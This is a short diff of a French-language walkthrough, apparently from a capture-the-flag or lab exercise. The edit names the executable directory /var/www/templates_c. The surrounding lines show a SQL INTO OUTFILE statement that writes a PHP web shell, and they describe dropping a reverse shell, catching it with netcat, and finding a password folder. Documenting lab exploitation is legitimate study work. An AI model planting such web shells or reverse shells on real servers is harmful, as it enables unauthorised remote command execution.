@@ -23,7 +23,7 @@ Best regards.
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
-- en testant tout les dossiers du forum un est executable templates_c
+- en testant tout les dossiers du forum un est executable `/var/www/templates_c`
 - Je creer donc un fichier avec un reverse shell pour que se soit plus facile et je creer un serveur en local avec netcat
 - dans les home un dossier est presant LOOKATME qui contient un dossier password
 ```
